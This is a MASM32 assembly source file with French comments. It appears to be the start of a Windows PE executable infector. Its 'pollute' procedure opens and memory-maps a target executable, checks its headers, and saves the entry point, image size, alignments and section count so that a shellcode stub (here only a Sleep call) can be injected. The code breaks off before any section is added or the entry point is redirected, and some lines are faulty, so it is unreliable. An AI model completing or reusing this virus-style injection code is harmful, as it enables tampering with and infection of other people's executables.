.486
.model flat, stdcall
option casemap:none

include c:\masm32\include\windows.inc
include c:\masm32\include\kernel32.inc
include c:\masm32\include\user32.inc
include  c:\masm32\include\msvcrt.inc

includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\msvcrt.lib

.data

shellcode db 33h, 192, 66h, 184,37h, 13h, 50h , 184, 42h, 24h, 80h, 7ch,  255, 208,  233,0  ;shellcode sleep(4919)
onError db "Errorz", 13, 10, 0
onSuccess db "Success", 13, 10, 0


varPutInt db "int: %p",13,10, 0
filename db  "toto.exe", 0

.data?

;infosExecutable dd ? 
infosPE    dd ?
tailleSection dd ?
executableHandle HANDLE ?
executableMap HANDLE ?
executableEnMemoire LPVOID ?
;infosExecutable IMAGE_DOS_HEADER  <>  
;PinfosExecutable dd ?


ptrEntryPoint  dd ?
pointeurSizeOfImage dd ?
sectionAlignment dd ?
fileAlignment dd ?
sauvegardeEntryPoint dd ?
pointeurNombreDeSection dd ?
nombreDeSection dw ?

infosSection dw ?

.code
	
start:

;long tailleSection = strlen(shellcode) + (sizeof(DWORD)); 
; taille du shellcode +  old entrypoint  
push offset shellcode
call crt_strlen
mov tailleSection , eax
add tailleSection, sizeof(DWORD)


push offset filename
call  pollute

exit:
invoke crt_printf,  offset onSuccess
invoke ExitProcess, 0

exiterror:
call GetLastError
invoke crt_printf, offset varPutInt, eax
invoke crt_printf,  offset onError
invoke ExitProcess, 1


pollute proc   filename1 : DWORD


; Affiche le nom du fichier
;invoke crt_printf, filename1

; Opens file for both read and write                                                                                                                                                                   
mov	eax, GENERIC_WRITE
or            eax, GENERIC_READ
invoke     CreateFile,  filename1, eax, 0, 0, OPEN_EXISTING, 0, 0
mov             executableHandle, eax 
cmp  eax,  INVALID_HANDLE_VALUE
je exiterror

; HANDLE executableMappe = CreateFileMapping(executableHandle , NULL , PAGE_READWRITE , 0  , 0 , NULL) 
 invoke CreateFileMapping,  executableHandle, 0, PAGE_READWRITE , 0  , 0 , 0
mov executableMap, eax
cmp  eax,  INVALID_HANDLE_VALUE
je exiterror
cmp eax, NULL
je exiterror

invoke  MapViewOfFile, executableMap, FILE_MAP_ALL_ACCESS , 0 , 0, 0
; LPVOID executableEnMemoire = MapViewOfFile(executableMappe , FILE_MAP_ALL_ACCESS , 0 ,  0, 0)
mov executableEnMemoire, eax
cmp eax, NULL
je exiterror


;invoke crt_printf,  offset varPutInt,  [eax].e_lfanew


;invoke crt_memcpy, infosExecutable, eax,  sizeof IMAGE_DOS_HEADER
;mov PinfosExecutable, eax

 ;ebx  <=> PIMAGE_DOS_HEADER
mov ebx, eax
assume  ebx: ptr IMAGE_DOS_HEADER

cmp [ebx].e_magic, IMAGE_DOS_SIGNATURE
jne exiterror



;infosPE = (PIMAGE_NT_HEADERS)((PUCHAR)infosExecutable + infosExecutable->e_lfanew);
; ebx += [ebx].e_lfanew
;; on pointe vers IMAGE_NT_HEADER
add ebx, [ebx].e_lfanew
assume ebx: ptr IMAGE_NT_HEADERS

cmp [ebx].Signature,  IMAGE_NT_SIGNATURE
jne exiterror


;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
; esi = OptionalHeader
 lea esi, [ebx].OptionalHeader
 assume esi :ptr IMAGE_OPTIONAL_HEADER
 
;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
mov ptrEntryPoint, esi
add ptrEntryPoint, 10h

;PDWORD pointeurSizeOfImage = &infosPE->OptionalHeader.SizeOfImage;
mov pointeurSizeOfImage, esi
add pointeurSizeOfImage, 38h

;DWORD sectionAlignment = infosPE->OptionalHeader.SectionAlignment;
mov eax,  [esi].SectionAlignment
mov sectionAlignment, eax

;DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
mov eax,  [esi].FileAlignment
mov fileAlignment, eax

;DWORD sauvegardeEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;
mov eax,  [esi].AddressOfEntryPoint
mov sauvegardeEntryPoint, eax




; edi = FileHeader
lea edi, [ebx].FileHeader
 assume edi :ptr IMAGE_FILE_HEADER
 invoke crt_printf, offset varPutInt,  [edi].NumberOfSections

;PWORD pointeurNombreDeSection = &infosPE->FileHeader.NumberOfSections;
mov pointeurNombreDeSection, edi
add pointeurNombreDeSection, 02h

;WORD nombreDeSection = &infosPE->FileHeader.NumberOfSections;
mov ax, [edi].NumberOfSections
mov nombreDeSection, ax

;invoke crt_printf, offset varPutInt,  eax

;mov eax, pointeurNombreDeSection
;mov eax, [eax]
;push ax
;push offset varPutInt
;call crt_printf
;invoke crt_printf, offset varPutInt,  nombreDeSection
    

;    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
;    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );

mov infosSection, ebx
;add infoSection, sizeof IMAGE_NT_HEADERS
;mov eax, 
;mul eax, 


ret
pollute endp


end start